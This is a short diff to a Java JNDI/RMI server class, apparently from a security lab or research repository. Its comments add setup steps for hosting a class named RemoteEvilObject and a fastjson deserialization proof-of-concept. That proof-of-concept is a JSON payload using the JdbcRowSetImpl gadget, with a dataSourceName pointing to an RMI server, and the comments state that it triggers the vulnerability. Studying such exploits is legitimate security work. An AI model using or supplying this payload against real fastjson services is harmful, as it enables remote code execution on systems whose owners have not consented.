@@ -11,6 +11,12 @@ public class JndiServer {
      * 2. python -m SimpleHTTPServer 8086
      * 4. jar cvf  remote.jar    RemoteEvilObject.class
      * 3. 运行 main
+     * 4. 使用fastjson的poc
+     * {
+     * "aaa": {"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},
+     * "bbb": {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:1099/anything","autoCommit":true}
+     * }
+     * 即可触发漏洞
      */
     public static void main(String[] args) throws Exception {
         System.out.println("创建RMI注册表");
